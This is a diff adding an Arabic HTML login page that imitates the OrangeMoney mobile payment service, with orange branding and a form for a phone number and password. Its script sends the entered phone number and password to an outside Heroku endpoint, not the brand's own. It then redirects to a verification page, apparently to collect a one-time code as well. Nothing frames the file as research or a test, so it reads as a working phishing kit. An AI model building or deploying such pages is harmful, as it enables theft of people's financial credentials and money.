@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول | OrangeMoney</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: rgba(255, 255, 255, 0.9); /* واجهة شفافة */
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 20px;
+            border-radius: 10px;
+            background-color: rgba(255, 255, 255, 0.8);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        .title {
+            color: black; /* لون العنوان الأسود */
+            text-align: right; /* محاذاة العنوان إلى اليمين */
+        }
+        .subtitle {
+            color: #FF8C00; /* لون العنوان البرتقالي */
+            text-align: left; /* محاذاة العنوان إلى اليسار */
+            margin-top: 0; /* إزالة المسافة العلوية */
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        button {
+            background-color: #FF8C00; /* لون الزر برتقالي غامق */
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%; /* يغطي العرض بالكامل */
+        }
+        button:hover {
+            opacity: 0.8;
+        }
+        .footer-image {
+            margin-top: 20px;
+            width: 100%;
+            max-width: 300px;
+        }
+        .header-image {
+            width: 100%;
+            max-width: 400px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        .right-align {
+            text-align: right; /* محاذاة النص إلى اليمين */
+            direction: rtl; /* اتجاه النص من اليمين إلى اليسار */
+            display: block; /* تأكيد أن التسمية تظهر ككتلة منفصلة */
+            margin-bottom: 5px; /* مسافة سفلية بين التسمية ومدخل النص */
+        }
+    </style>
+    <script>
+        function redirectToVerification() {
+            var phoneNumber = document.getElementById("phone-input").value;
+            var password = document.getElementById("password-input").value;
+
+            fetch('https://your-app-name.herokuapp.com/submit', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ phoneNumber: phoneNumber, password: password })
+            })
+            .then(response => response.json())
+            .then(data => {
+                setTimeout(function() {
+                    window.location.href = 'verification.html?phone=' + encodeURIComponent(phoneNumber);
+                }, 500);
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <img src="images/f061f6_cca11f866a394ecc993a763d2f7a3128~mv2.jpg" alt="صورة مقدمة الصفحة" class="header-image">
+        <h1 class="title">تسجيل الدخول الى حسابي</h1>
+        <h2 class="subtitle">OrangeMoney</h2>
+        
+        <label class="right-align">يرجى ادخال رقم موبايل <span style="color: #FF8C00;">orange</span></label>
+        <input id="phone-input" type="text" placeholder="" maxlength="10" required>
+        <small class="right-align">يرجى ادخال الرقم الذي يبدأ ب 077/078/079</small>
+        
+        <div style="margin: 20px 0;"></div>
+
+        <label class="right-align">يرجى ادخال كلمة سر</label>
+        <input id="password-input" type="password" placeholder="أدخل كلمة السر" required>
+        <small class="right-align">كتابة حروف ورموز وأرقام</small>
+        <br>
+
+        <label class="right-align">
+            <input type="checkbox"> تذكرني
+        </label>
+        <br>
+        <button onclick="redirectToVerification()">تسجيل الدخول</button>
+    </div>
+
+    <img src="images/img_20240715_044418_669.jpg" alt="صورة في آخر الصفحة" class="footer-image">
+</body>
+</html>
